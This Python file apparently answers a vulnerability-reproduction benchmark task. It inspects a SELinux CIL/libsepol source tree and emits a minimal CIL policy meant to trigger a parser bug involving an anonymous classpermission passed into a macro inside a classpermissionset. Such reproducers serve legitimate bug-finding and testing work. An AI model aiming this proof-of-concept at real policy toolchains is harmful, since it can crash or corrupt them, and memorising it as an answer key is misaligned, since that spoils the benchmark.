import os
import re
import tarfile
from typing import List, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts = self._gather_texts(src_path)

        macro_uses_positional = self._detect_positional_macro_style(texts)
        macro_param_keyword = self._detect_macro_param_keyword(texts) or "classpermission"
        call_keyword = self._detect_call_keyword(texts) or "call"

        cpset_list_style = self._detect_classpermissionset_list_style(texts)
        if cpset_list_style is None:
            cpset_list_style = "nested"  # (classpermissionset s ((c (p))))

        item_style = self._detect_classpermissionset_item_style(texts)
        if item_style is None:
            item_style = "plain"  # item is (c (p))

        # Keep it minimal but valid-looking for cilc.
        # Trigger: anonymous classpermission passed into macro used in classpermissionset.
        block_name = "b"
        class_name = "c"
        perm_name = "p"
        type_name = "t"
        macro_name = "m"
        cpset_name = "s"

        if macro_uses_positional:
            param_name = "x"
            arg_ref = "$1"
        else:
            param_name = "x"
            arg_ref = "$" + param_name

        # Decide how to express the anonymous classpermission
        if item_style == "prefixed":
            anon_cp = f"(classpermission ({class_name} ({perm_name})))"
        else:
            anon_cp = f"({class_name} ({perm_name}))"

        # Build classpermissionset statement inside macro
        if cpset_list_style == "direct":
            # Uncommon: (classpermissionset s (c (p))) or (classpermissionset s $ref)
            # Prefer $ref directly to avoid extra parentheses mismatch
            cpset_stmt = f"(classpermissionset {cpset_name} {arg_ref})"
        else:
            # Common: (classpermissionset s ((c (p))))
            cpset_stmt = f"(classpermissionset {cpset_name} ({arg_ref}))"

        cil = (
            f"(block {block_name}\n"
            f" (class {class_name} ({perm_name}))\n"
            f" (type {type_name})\n"
            f" (macro {macro_name} (({macro_param_keyword} {param_name}))\n"
            f"  {cpset_stmt}\n"
            f" )\n"
            f" ({call_keyword} {macro_name} {anon_cp})\n"
            f" (allow {type_name} {type_name} ({class_name} ({perm_name})))\n"
            f")\n"
        ).encode("utf-8", "strict")

        return cil

    def _gather_texts(self, src_path: str) -> List[str]:
        texts: List[str] = []
        max_total = 12 * 1024 * 1024
        max_file = 2 * 1024 * 1024
        total = 0

        def should_read(name: str) -> bool:
            ln = name.lower()
            if any(x in ln for x in ("cil", "sepol", "parser", "macro", "policy")):
                return True
            ext_ok = (
                ln.endswith(".c")
                or ln.endswith(".h")
                or ln.endswith(".txt")
                or ln.endswith(".md")
                or ln.endswith(".rst")
                or ln.endswith(".in")
                or ln.endswith(".cil")
            )
            return ext_ok

        def add_blob(blob: bytes):
            nonlocal total
            if not blob:
                return
            if len(blob) > max_file:
                blob = blob[:max_file]
            try:
                s = blob.decode("utf-8", "ignore")
            except Exception:
                try:
                    s = blob.decode("latin-1", "ignore")
                except Exception:
                    return
            texts.append(s)
            total += len(blob)

        if not src_path:
            return texts

        try:
            if os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    for fn in files:
                        if total >= max_total:
                            return texts
                        p = os.path.join(root, fn)
                        if not should_read(p):
                            continue
                        try:
                            st = os.stat(p)
                            if st.st_size <= 0:
                                continue
                            with open(p, "rb") as f:
                                add_blob(f.read(max_file))
                        except Exception:
                            continue
                return texts

            if os.path.isfile(src_path):
                # Try tar first
                try:
                    with tarfile.open(src_path, "r:*") as tf:
                        for m in tf.getmembers():
                            if total >= max_total:
                                break
                            if not m.isfile():
                                continue
                            if m.size <= 0:
                                continue
                            name = m.name or ""
                            if not should_read(name):
                                continue
                            try:
                                f = tf.extractfile(m)
                                if f is None:
                                    continue
                                add_blob(f.read(max_file))
                            except Exception:
                                continue
                    return texts
                except Exception:
                    # Not a tar; read directly
                    try:
                        with open(src_path, "rb") as f:
                            add_blob(f.read(max_file))
                    except Exception:
                        pass
        except Exception:
            pass

        return texts

    def _detect_positional_macro_style(self, texts: List[str]) -> bool:
        # If any macro definition snippet uses $1, assume positional parameters.
        macro_pat = re.compile(r"\(\s*macro\b", re.IGNORECASE)
        for t in texts:
            for m in macro_pat.finditer(t):
                start = m.start()
                snippet = t[start : start + 800]
                if "$1" in snippet or "$2" in snippet:
                    return True
        # Fallback: if any $1 exists anywhere, likely positional
        for t in texts:
            if "$1" in t:
                return True
        return False

    def _detect_macro_param_keyword(self, texts: List[str]) -> Optional[str]:
        # Try to infer whether the parser recognizes "classpermission" or "classperms" as a macro param flavor.
        # Prefer "classpermission" if present (matches vulnerability description).
        joined = "\n".join(texts[:20]) if texts else ""
        if re.search(r'"\s*classpermission\s*"', joined) or "classpermission" in joined:
            return "classpermission"
        if re.search(r'"\s*classperms\s*"', joined) or "classperms" in joined:
            return "classperms"
        return None

    def _detect_call_keyword(self, texts: List[str]) -> Optional[str]:
        # Most versions use "call". If absent, some older variants might use "call_macro" etc,
        # but we only support call if detectable.
        for t in texts:
            if "(call " in t or "\n(call " in t or "\t(call " in t:
                return "call"
        # Search for keyword definitions
        for t in texts:
            if "CIL_KEY_CALL" in t and "call" in t:
                return "call"
        return None

    def _detect_classpermissionset_list_style(self, texts: List[str]) -> Optional[str]:
        # Returns "nested" for (classpermissionset s ((file (...)) ...))
        # Returns "direct" for (classpermissionset s (file (...))) or other direct form.
        cps_pat = re.compile(r"\(\s*classpermissionset\b", re.IGNORECASE)
        for t in texts:
            m = cps_pat.search(t)
            if not m:
                continue
            snippet = t[m.start() : m.start() + 400]
            # Try to locate the list start after set name
            # pattern: (classpermissionset <name> <ws> (<content>
            m2 = re.search(r"\(\s*classpermissionset\b\s+([^\s\(\)]+)\s*\(", snippet, re.IGNORECASE)
            if not m2:
                continue
            idx = m2.end()  # points just after '(' starting list content
            rest = snippet[idx:].lstrip()
            if rest.startswith("("):
                return "nested"
            if rest:
                return "direct"
        return None

    def _detect_classpermissionset_item_style(self, texts: List[str]) -> Optional[str]:
        # Returns "prefixed" if examples show items like (classpermission ...)
        # Returns "plain" if items look like (file (...)) etc.
        cps_pat = re.compile(r"\(\s*classpermissionset\b", re.IGNORECASE)
        for t in texts:
            m = cps_pat.search(t)
            if not m:
                continue
            snippet = t[m.start() : m.start() + 600]
            m2 = re.search(r"\(\s*classpermissionset\b\s+([^\s\(\)]+)\s*\(", snippet, re.IGNORECASE)
            if not m2:
                continue
            idx = m2.end()
            rest = snippet[idx:].lstrip()
            # If nested list, may start with '(' then item starts
            if rest.startswith("("):
                rest2 = rest[1:].lstrip()
                if rest2.lower().startswith("classpermission"):
                    return "prefixed"
                return "plain"
            if rest.lower().startswith("classpermission"):
                return "prefixed"
        return None